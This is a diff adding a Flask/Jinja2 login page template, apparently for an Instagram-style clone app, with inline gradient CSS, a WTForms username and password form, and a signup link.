@@ -1,0 +1,18 @@
+{% extends 'base.html' %} {% block head %}
+<title>Login</title>
+{% endblock %} {% block style %} body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(to right, #ffcc00, #ff6699); } .container { max-width:
+400px; width: 100%; } .login-box { background: linear-gradient(to right, #66ccff, #cc99ff); padding: 40px; border: 1px solid #ccc; border-radius: 5px; text-align: center; } .login-box img { width: 100px; margin-bottom: 20px; } input { display: block;
+width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; } button { background-color: #3897f0; color: #fff; border: none; border-radius: 5px; padding: 10px 20px; cursor: pointer; font-size: 16px; transition: background-color
+0.3s ease; margin-top: 10px; } button:hover { background-color: #1877f2; } a { text-decoration: none; color: #3897f0; } .signup-box { padding: 20px; text-align: center; border: 1px solid #ccc; border-radius: 5px; margin-top: 2px;background: linear-gradient(to
+right, #66ccff, #cc99ff) } {% endblock %} {% block body %}
+
+<form action="" method="POST">
+    <div class="container">
+        <div class="login-box">
+            <img src={{icon}} alt="Instagram Logo "> {{ form.hidden_tag() }} {{ form.username }} {{ form.password}} {{ form.submit }}
+        </div>
+        <div class=" signup-box ">Don't have an account? <a href="{{ url_for( 'signup') }} ">Sign up</div>
+    </div>
+</form>
+
+{% endblock %}
